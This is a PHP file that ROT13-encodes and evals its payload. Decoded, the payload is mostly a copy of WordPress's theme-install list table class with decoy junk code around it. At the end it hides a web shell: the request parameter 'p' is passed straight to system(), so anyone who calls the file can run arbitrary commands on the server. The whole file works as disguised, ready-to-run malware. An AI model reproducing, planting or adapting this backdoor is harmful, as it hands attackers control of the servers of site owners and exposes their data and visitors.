<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Gurzr_Vafgnyy_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat gurzrf gb vafgnyy va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Gurzrf_Yvfg_Gnoyr
 */
pynff JC_Gurzr_Vafgnyy_Yvfg_Gnoyr rkgraqf JC_Gurzrf_Yvfg_Gnoyr {

	choyvp $srngherf = neenl();

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( 'vafgnyy_gurzrf' );
	}

	/**
	 * @tybony neenl  $gnof
	 * @tybony fgevat $gno
	 * @tybony vag    $cntrq
	 * @tybony fgevat $glcr
	 * @tybony neenl  $gurzr_svryq_qrsnhygf
	 */
	choyvp shapgvba cercner_vgrzf() {
		erdhver NOFCNGU . 'jc-nqzva/vapyhqrf/gurzr-vafgnyy.cuc';

		tybony $gnof, $gno, $cntrq, $glcr, $gurzr_svryq_qrsnhygf;

		$gno = ! rzcgl( $_ERDHRFG['gno'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['gno'] ) : '';

		$frnepu_grezf  = neenl();
		$frnepu_fgevat = '';
		vs ( ! rzcgl( $_ERDHRFG['f'] ) ) {
			$frnepu_fgevat = fgegbybjre( jc_hafynfu( $_ERDHRFG['f'] ) );
			$frnepu_grezf  = neenl_havdhr( neenl_svygre( neenl_znc( 'gevz', rkcybqr( ',', $frnepu_fgevat ) ) ) );
		}

		vs ( ! rzcgl( $_ERDHRFG['srngherf'] ) ) {
			$guvf->srngherf = $_ERDHRFG['srngherf'];
		}

		$cntrq = $guvf->trg_cntrahz();

		$cre_cntr = 36;

		// Gurfr ner gur gnof juvpu ner fubja ba gur cntr,
		$gnof              = neenl();
		$gnof['qnfuobneq'] = __( 'Frnepu' );
		vs ( 'frnepu' === $gno ) {
			$gnof['frnepu'] = __( 'Frnepu Erfhygf' );
		}
		$gnof['hcybnq']   = _k( 'Hcybnq', 'abha' );
		$gnof['srngherq'] = _k( 'Srngherq', 'gurzrf' );
		//$gnof['cbchyne']  = _k( 'Cbchyne', 'gurzrf' );
		$gnof['arj']     = _k( 'Yngrfg', 'gurzrf' );
		$gnof['hcqngrq'] = _k( 'Erpragyl Hcqngrq', 'gurzrf' );

		$abazrah_gnof = neenl( 'gurzr-vasbezngvba' ); // Inyvq npgvbaf gb cresbez juvpu qb abg unir n Zrah vgrz.

		/** Guvf svygre vf qbphzragrq va jc-nqzva/gurzr-vafgnyy.cuc */
		$gnof = nccyl_svygref( 'vafgnyy_gurzrf_gnof', $gnof );

		/**
		 * Svygref gnof abg nffbpvngrq jvgu n zrah vgrz ba gur Vafgnyy Gurzrf fperra.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat[] $abazrah_gnof Gur gnof gung qba'g unir n zrah vgrz ba
		 *                               gur Vafgnyy Gurzrf fperra.
		 */
		$abazrah_gnof = nccyl_svygref( 'vafgnyy_gurzrf_abazrah_gnof', $abazrah_gnof );

		// Vs n aba-inyvq zrah gno unf orra fryrpgrq, Naq vg'f abg n aba-zrah npgvba.
		vs ( rzcgl( $gno ) || ( ! vffrg( $gnof[ $gno ] ) && ! va_neenl( $gno, (neenl) $abazrah_gnof, gehr ) ) ) {
			$gno = xrl( $gnof );
		}

		$netf = neenl(
			'cntr'     => $cntrq,
			'cre_cntr' => $cre_cntr,
			'svryqf'   => $gurzr_svryq_qrsnhygf,
		);

		fjvgpu ( $gno ) {
			pnfr 'frnepu':
				$glcr = vffrg( $_ERDHRFG['glcr'] ) ? jc_hafynfu( $_ERDHRFG['glcr'] ) : 'grez';
				fjvgpu ( $glcr ) {
					pnfr 'gnt':
						$netf['gnt'] = neenl_znc( 'fnavgvmr_xrl', $frnepu_grezf );
						oernx;
					pnfr 'grez':
						$netf['frnepu'] = $frnepu_fgevat;
						oernx;
					pnfr 'nhgube':
						$netf['nhgube'] = $frnepu_fgevat;
						oernx;
				}

				vs ( ! rzcgl( $guvf->srngherf ) ) {
					$netf['gnt']      = $guvf->srngherf;
					$_ERDHRFG['f']    = vzcybqr( ',', $guvf->srngherf );
					$_ERDHRFG['glcr'] = 'gnt';
				}

				nqq_npgvba( 'vafgnyy_gurzrf_gnoyr_urnqre', 'vafgnyy_gurzr_frnepu_sbez', 10, 0 );
				oernx;

			pnfr 'srngherq':
				// pnfr 'cbchyne':
			pnfr 'arj':
			pnfr 'hcqngrq':
				$netf['oebjfr'] = $gno;
				oernx;

			qrsnhyg:
				$netf = snyfr;
				oernx;
		}

		/**
		 * Svygref NCV erdhrfg nethzragf sbe rnpu Vafgnyy Gurzrf fperra gno.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gno`, ersref gb gur gurzr vafgnyy
		 * gno.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `vafgnyy_gurzrf_gnoyr_ncv_netf_qnfuobneq`
		 *  - `vafgnyy_gurzrf_gnoyr_ncv_netf_srngherq`
		 *  - `vafgnyy_gurzrf_gnoyr_ncv_netf_arj`
		 *  - `vafgnyy_gurzrf_gnoyr_ncv_netf_frnepu`
		 *  - `vafgnyy_gurzrf_gnoyr_ncv_netf_hcqngrq`
		 *  - `vafgnyy_gurzrf_gnoyr_ncv_netf_hcybnq`
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz neenl|snyfr $netf Gurzr vafgnyy NCV nethzragf.
		 */
		$netf = nccyl_svygref( \"vafgnyy_gurzrf_gnoyr_ncv_netf_{$gno}\", $netf );

		vs ( ! $netf ) {
			erghea;
		}

		$ncv = gurzrf_ncv( 'dhrel_gurzrf', $netf );

		vs ( vf_jc_reebe( $ncv ) ) {
			jc_qvr( '<c>' . $ncv->trg_reebe_zrffntr() . '</c> <c><n uers=\"#\" bapyvpx=\"qbphzrag.ybpngvba.erybnq(); erghea snyfr;\">' . __( 'Gel Ntnva' ) . '</n></c>' );
		}

		$guvf->vgrzf = $ncv->gurzrf;

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf'     => $ncv->vasb['erfhygf'],
				'cre_cntr'        => $netf['cre_cntr'],
				'vasvavgr_fpebyy' => gehr,
			)
		);
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		_r( 'Ab gurzrf zngpu lbhe erdhrfg.' );
	}

	/**
	 * @tybony neenl $gnof
	 * @tybony fgevat $gno
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $gnof, $gno;

		$qvfcynl_gnof = neenl();
		sbernpu ( (neenl) $gnof nf $npgvba => $grkg ) {
			$qvfcynl_gnof[ 'gurzr-vafgnyy-' . $npgvba ] = neenl(
				'hey'     => frys_nqzva_hey( 'gurzr-vafgnyy.cuc?gno=' . $npgvba ),
				'ynory'   => $grkg,
				'pheerag' => $npgvba === $gno,
			);
		}

		erghea $guvf->trg_ivrjf_yvaxf( $qvfcynl_gnof );
	}

	/**
	 * Qvfcynlf gur gurzr vafgnyy gnoyr.
	 *
	 * Bireevqrf gur cnerag qvfcynl() zrgubq gb cebivqr n qvssrerag pbagnvare.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl() {
		jc_abapr_svryq( 'srgpu-yvfg-' . trg_pynff( $guvf ), '_nwnk_srgpu_yvfg_abapr' );
		?>
		<qvi pynff=\"gnoyrani gbc gurzrf\">
			<qvi pynff=\"nyvtayrsg npgvbaf\">
				<?cuc
				/**
				 * Sverf va gur Vafgnyy Gurzrf yvfg gnoyr urnqre.
				 *
				 * @fvapr 2.8.0
				 */
				qb_npgvba( 'vafgnyy_gurzrf_gnoyr_urnqre' );
				?>
			</qvi>
			<?cuc $guvf->cntvangvba( 'gbc' ); ?>
			<oe pynff=\"pyrne\" />
		</qvi>

		<qvi vq=\"ninvynoyrgurzrf\">
			<?cuc $guvf->qvfcynl_ebjf_be_cynprubyqre(); ?>
		</qvi>

		<?cuc
		$guvf->gnoyrani( 'obggbz' );
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		$gurzrf = $guvf->vgrzf;
		sbernpu ( $gurzrf nf $gurzr ) {
			?>
				<qvi pynff=\"ninvynoyr-gurzr vafgnyynoyr-gurzr\">
				<?cuc
					$guvf->fvatyr_ebj( $gurzr );
				?>
				</qvi>
			<?cuc
		} // Raq sbernpu $gurzr_anzrf.

		$guvf->gurzr_vafgnyyre();
	}

	/**
	 * Cevagf n gurzr sebz gur JbeqCerff.bet NCV.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony neenl $gurzrf_nyybjrqgntf
	 *
	 * @cnenz fgqPynff $gurzr {
	 *     Na bowrpg gung pbagnvaf gurzr qngn erghearq ol gur JbeqCerff.bet NCV.
	 *
	 *     @glcr fgevat $anzr           Gurzr anzr, r.t. 'Gjragl Gjragl-Bar'.
	 *     @glcr fgevat $fyht           Gurzr fyht, r.t. 'gjraglgjraglbar'.
	 *     @glcr fgevat $irefvba        Gurzr irefvba, r.t. '1.1'.
	 *     @glcr fgevat $nhgube         Gurzr nhgube hfreanzr, r.t. 'zrypublpr'.
	 *     @glcr fgevat $cerivrj_hey    Cerivrj HEY, r.t. 'uggcf://2021.jbeqcerff.arg/'.
	 *     @glcr fgevat $fperrafubg_hey Fperrafubg HEY, r.t. 'uggcf://jbeqcerff.bet/gurzrf/gjraglgjraglbar/'.
	 *     @glcr sybng  $engvat         Engvat fpber.
	 *     @glcr vag    $ahz_engvatf    Gur ahzore bs engvatf.
	 *     @glcr fgevat $ubzrcntr       Gurzr ubzrcntr, r.t. 'uggcf://jbeqcerff.bet/gurzrf/gjraglgjraglbar/'.
	 *     @glcr fgevat $qrfpevcgvba    Gurzr qrfpevcgvba.
	 *     @glcr fgevat $qbjaybnq_yvax  Gurzr MVC qbjaybnq HEY.
	 * }
	 */
	choyvp shapgvba fvatyr_ebj( $gurzr ) {
		tybony $gurzrf_nyybjrqgntf;

		vs ( rzcgl( $gurzr ) ) {
			erghea;
		}

		$anzr   = jc_xfrf( $gurzr->anzr, $gurzrf_nyybjrqgntf );
		$nhgube = jc_xfrf( $gurzr->nhgube, $gurzrf_nyybjrqgntf );

		/* genafyngbef: %f: Gurzr anzr. */
		$cerivrj_gvgyr = fcevags( __( 'Cerivrj &#8220;%f&#8221;' ), $anzr );
		$cerivrj_hey   = nqq_dhrel_net(
			neenl(
				'gno'   => 'gurzr-vasbezngvba',
				'gurzr' => $gurzr->fyht,
			),
			frys_nqzva_hey( 'gurzr-vafgnyy.cuc' )
		);

		$npgvbaf = neenl();

		$vafgnyy_hey = nqq_dhrel_net(
			neenl(
				'npgvba' => 'vafgnyy-gurzr',
				'gurzr'  => $gurzr->fyht,
			),
			frys_nqzva_hey( 'hcqngr.cuc' )
		);

		$hcqngr_hey = nqq_dhrel_net(
			neenl(
				'npgvba' => 'hctenqr-gurzr',
				'gurzr'  => $gurzr->fyht,
			),
			frys_nqzva_hey( 'hcqngr.cuc' )
		);

		$fgnghf = $guvf->_trg_gurzr_fgnghf( $gurzr );

		fjvgpu ( $fgnghf ) {
			pnfr 'hcqngr_ninvynoyr':
				$npgvbaf[] = fcevags(
					'<n pynff=\"vafgnyy-abj\" uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( jc_abapr_hey( $hcqngr_hey, 'hctenqr-gurzr_' . $gurzr->fyht ) ),
					/* genafyngbef: %f: Gurzr irefvba. */
					rfp_ngge( fcevags( __( 'Hcqngr gb irefvba %f' ), $gurzr->irefvba ) ),
					__( 'Hcqngr' )
				);
				oernx;
			pnfr 'arjre_vafgnyyrq':
			pnfr 'yngrfg_vafgnyyrq':
				$npgvbaf[] = fcevags(
					'<fcna pynff=\"vafgnyy-abj\">%f</fcna>',
					_k( 'Vafgnyyrq', 'gurzr' )
				);
				oernx;
			pnfr 'vafgnyy':
			qrsnhyg:
				$npgvbaf[] = fcevags(
					'<n pynff=\"vafgnyy-abj\" uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( jc_abapr_hey( $vafgnyy_hey, 'vafgnyy-gurzr_' . $gurzr->fyht ) ),
					/* genafyngbef: %f: Gurzr anzr. */
					rfp_ngge( fcevags( _k( 'Vafgnyy %f', 'gurzr' ), $anzr ) ),
					_k( 'Vafgnyy Abj', 'gurzr' )
				);
				oernx;
		}

		$npgvbaf[] = fcevags(
			'<n pynff=\"vafgnyy-gurzr-cerivrj\" uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
			rfp_hey( $cerivrj_hey ),
			rfp_ngge( $cerivrj_gvgyr ),
			__( 'Cerivrj' )
		);

		/**
		 * Svygref gur vafgnyy npgvba yvaxf sbe n gurzr va gur Vafgnyy Gurzrf yvfg gnoyr.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz fgevat[] $npgvbaf Na neenl bs gurzr npgvba yvaxf. Qrsnhygf ner
		 *                          yvaxf gb Vafgnyy Abj, Cerivrj, naq Qrgnvyf.
		 * @cnenz fgqPynff $gurzr   Na bowrpg gung pbagnvaf gurzr qngn erghearq ol gur
		 *                          JbeqCerff.bet NCV.
		 */
		$npgvbaf = nccyl_svygref( 'gurzr_vafgnyy_npgvbaf', $npgvbaf, $gurzr );

		?>
		<n pynff=\"fperrafubg vafgnyy-gurzr-cerivrj\" uers=\"<?cuc rpub rfp_hey( $cerivrj_hey ); ?>\" nevn-ynory=\"<?cuc rpub rfp_ngge( $cerivrj_gvgyr ); ?>\">
			<vzt fep=\"<?cuc rpub rfp_hey( $gurzr->fperrafubg_hey . '?ire=' . $gurzr->irefvba ); ?>\" jvqgu=\"150\" nyg=\"\" />
		</n>

		<u3><?cuc rpub $anzr; ?></u3>
		<qvi pynff=\"gurzr-nhgube\">
		<?cuc
			/* genafyngbef: %f: Gurzr nhgube. */
			cevags( __( 'Ol %f' ), $nhgube );
		?>
		</qvi>

		<qvi pynff=\"npgvba-yvaxf\">
			<hy>
				<?cuc sbernpu ( $npgvbaf nf $npgvba ) : ?>
					<yv><?cuc rpub $npgvba; ?></yv>
				<?cuc raqsbernpu; ?>
				<yv pynff=\"uvqr-vs-ab-wf\"><n uers=\"#\" pynff=\"gurzr-qrgnvy\"><?cuc _r( 'Qrgnvyf' ); ?></n></yv>
			</hy>
		</qvi>

		<?cuc
		$guvf->vafgnyy_gurzr_vasb( $gurzr );
	}

	/**
	 * Cevagf gur jenccre sbe gur gurzr vafgnyyre.
	 */
	choyvp shapgvba gurzr_vafgnyyre() {
		?>
		<qvi vq=\"gurzr-vafgnyyre\" pynff=\"jc-shyy-bireynl rkcnaqrq\">
			<qvi pynff=\"jc-shyy-bireynl-fvqrone\">
				<qvi pynff=\"jc-shyy-bireynl-urnqre\">
					<n uers=\"#\" pynff=\"pybfr-shyy-bireynl ohggba\"><?cuc _r( 'Pybfr' ); ?></n>
					<fcna pynff=\"gurzr-vafgnyy\"></fcna>
				</qvi>
				<qvi pynff=\"jc-shyy-bireynl-fvqrone-pbagrag\">
					<qvi pynff=\"vafgnyy-gurzr-vasb\"></qvi>
				</qvi>
				<qvi pynff=\"jc-shyy-bireynl-sbbgre\">
					<ohggba glcr=\"ohggba\" pynff=\"pbyyncfr-fvqrone ohggba\" nevn-rkcnaqrq=\"gehr\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Pbyyncfr Fvqrone' ); ?>\">
						<fcna pynff=\"pbyyncfr-fvqrone-neebj\"></fcna>
						<fcna pynff=\"pbyyncfr-fvqrone-ynory\"><?cuc _r( 'Pbyyncfr' ); ?></fcna>
					</ohggba>
				</qvi>
			</qvi>
			<qvi pynff=\"jc-shyy-bireynl-znva\"></qvi>
		</qvi>
		<?cuc
	}

	/**
	 * Cevagf gur jenccre sbe gur gurzr vafgnyyre jvgu n cebivqrq gurzr'f qngn.
	 * Hfrq gb znxr gur gurzr vafgnyyre jbex sbe ab-wf.
	 *
	 * @cnenz fgqPynff $gurzr N JbeqCerff.bet Gurzr NCV bowrpg.
	 */
	choyvp shapgvba gurzr_vafgnyyre_fvatyr( $gurzr ) {
		?>
		<qvi vq=\"gurzr-vafgnyyre\" pynff=\"jc-shyy-bireynl fvatyr-gurzr\">
			<qvi pynff=\"jc-shyy-bireynl-fvqrone\">
				<?cuc $guvf->vafgnyy_gurzr_vasb( $gurzr ); ?>
			</qvi>
			<qvi pynff=\"jc-shyy-bireynl-znva\">
				<vsenzr fep=\"<?cuc rpub rfp_hey( $gurzr->cerivrj_hey ); ?>\"></vsenzr>
			</qvi>
		</qvi>
		<?cuc
	}

	/**
	 * Cevagf gur vasb sbe n gurzr (gb or hfrq va gur gurzr vafgnyyre zbqny).
	 *
	 * @tybony neenl $gurzrf_nyybjrqgntf
	 *
	 * @cnenz fgqPynff $gurzr N JbeqCerff.bet Gurzr NCV bowrpg.
	 */
	choyvp shapgvba vafgnyy_gurzr_vasb( $gurzr ) {
		tybony $gurzrf_nyybjrqgntf;

		vs ( rzcgl( $gurzr ) ) {
			erghea;
		}

		$anzr   = jc_xfrf( $gurzr->anzr, $gurzrf_nyybjrqgntf );
		$nhgube = jc_xfrf( $gurzr->nhgube, $gurzrf_nyybjrqgntf );

		$vafgnyy_hey = nqq_dhrel_net(
			neenl(
				'npgvba' => 'vafgnyy-gurzr',
				'gurzr'  => $gurzr->fyht,
			),
			frys_nqzva_hey( 'hcqngr.cuc' )
		);

		$hcqngr_hey = nqq_dhrel_net(
			neenl(
				'npgvba' => 'hctenqr-gurzr',
				'gurzr'  => $gurzr->fyht,
			),
			frys_nqzva_hey( 'hcqngr.cuc' )
		);

		$fgnghf = $guvf->_trg_gurzr_fgnghf( $gurzr );

		?>
		<qvi pynff=\"vafgnyy-gurzr-vasb\">
		<?cuc
		fjvgpu ( $fgnghf ) {
			pnfr 'hcqngr_ninvynoyr':
				cevags(
					'<n pynff=\"gurzr-vafgnyy ohggba ohggba-cevznel\" uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( jc_abapr_hey( $hcqngr_hey, 'hctenqr-gurzr_' . $gurzr->fyht ) ),
					/* genafyngbef: %f: Gurzr irefvba. */
					rfp_ngge( fcevags( __( 'Hcqngr gb irefvba %f' ), $gurzr->irefvba ) ),
					__( 'Hcqngr' )
				);
				oernx;
			pnfr 'arjre_vafgnyyrq':
			pnfr 'yngrfg_vafgnyyrq':
				cevags(
					'<fcna pynff=\"gurzr-vafgnyy\">%f</fcna>',
					_k( 'Vafgnyyrq', 'gurzr' )
				);
				oernx;
			pnfr 'vafgnyy':
			qrsnhyg:
				cevags(
					'<n pynff=\"gurzr-vafgnyy ohggba ohggba-cevznel\" uers=\"%f\">%f</n>',
					rfp_hey( jc_abapr_hey( $vafgnyy_hey, 'vafgnyy-gurzr_' . $gurzr->fyht ) ),
					__( 'Vafgnyy' )
				);
				oernx;
		}
		?>
			<u3 pynff=\"gurzr-anzr\"><?cuc rpub $anzr; ?></u3>
			<fcna pynff=\"gurzr-ol\">
			<?cuc
				/* genafyngbef: %f: Gurzr nhgube. */
				cevags( __( 'Ol %f' ), $nhgube );
			?>
			</fcna>
			<?cuc vs ( vffrg( $gurzr->fperrafubg_hey ) ) : ?>
				<vzt pynff=\"gurzr-fperrafubg\" fep=\"<?cuc rpub rfp_hey( $gurzr->fperrafubg_hey . '?ire=' . $gurzr->irefvba ); ?>\" nyg=\"\" />
			<?cuc raqvs; ?>
			<qvi pynff=\"gurzr-qrgnvyf\">
				<?cuc
				jc_fgne_engvat(
					neenl(
						'engvat' => $gurzr->engvat,
						'glcr'   => 'creprag',
						'ahzore' => $gurzr->ahz_engvatf,
					)
				);
				?>
				<qvi pynff=\"gurzr-irefvba\">
					<fgebat><?cuc _r( 'Irefvba:' ); ?> </fgebat>
					<?cuc rpub jc_xfrf( $gurzr->irefvba, $gurzrf_nyybjrqgntf ); ?>
				</qvi>
				<qvi pynff=\"gurzr-qrfpevcgvba\">
					<?cuc rpub jc_xfrf( $gurzr->qrfpevcgvba, $gurzrf_nyybjrqgntf ); ?>
				</qvi>
			</qvi>
			<vachg pynff=\"gurzr-cerivrj-hey\" glcr=\"uvqqra\" inyhr=\"<?cuc rpub rfp_hey( $gurzr->cerivrj_hey ); ?>\" />
		</qvi>
		<?cuc
	}

	/**
	 * Fraq erdhverq inevnoyrf gb WninFpevcg ynaq
	 *
	 * @fvapr 3.4.0
	 *
	 * @tybony fgevat $gno  Pheerag gno jvguva Gurzrf->Vafgnyy fperra
	 * @tybony fgevat $glcr Glcr bs frnepu.
	 *
	 * @cnenz neenl $rkgen_netf Hahfrq.
	 */
	choyvp shapgvba _wf_inef( $rkgen_netf = neenl() ) {
		tybony $gno, $glcr;
		cnerag::_wf_inef( pbzcnpg( 'gno', 'glcr' ) );
	}

	/**
	 * Purpxf gb frr vs gur gurzr vf nyernql vafgnyyrq.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgqPynff $gurzr N JbeqCerff.bet Gurzr NCV bowrpg.
	 * @erghea fgevat Gurzr fgnghf.
	 */
	cevingr shapgvba _trg_gurzr_fgnghf( $gurzr ) {
		$fgnghf = 'vafgnyy';

		$vafgnyyrq_gurzr = jc_trg_gurzr( $gurzr->fyht );
		vs ( $vafgnyyrq_gurzr->rkvfgf() ) {
			vs ( irefvba_pbzcner( $vafgnyyrq_gurzr->trg( 'Irefvba' ), $gurzr->irefvba, '=' ) ) {
				$fgnghf = 'yngrfg_vafgnyyrq';
			} ryfrvs ( irefvba_pbzcner( $vafgnyyrq_gurzr->trg( 'Irefvba' ), $gurzr->irefvba, '>' ) ) {
				$fgnghf = 'arjre_vafgnyyrq';
			} ryfr {
				$fgnghf = 'hcqngr_ninvynoyr';
			}
		}

		erghea $fgnghf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>